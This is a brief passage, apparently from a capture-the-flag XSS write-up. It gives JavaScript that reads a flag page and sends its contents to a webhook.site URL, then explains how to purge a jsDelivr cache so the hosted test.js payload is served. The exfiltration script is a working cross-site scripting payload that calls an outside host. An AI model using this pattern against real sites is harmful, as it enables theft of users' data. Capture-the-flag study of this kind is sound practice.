fetch('/xss-two-flag')
  .then(r => r.text())
  .then(flag => {
    fetch('https://webhook.site/bd768cbb-7b2f-482a-8f91-86c61918d6af?flag=' + encodeURIComponent(flag));
  });
```

Then commit, purge the cache at:
```
https://purge.jsdelivr.net/gh/stevvv2005/ctf@main/test.js
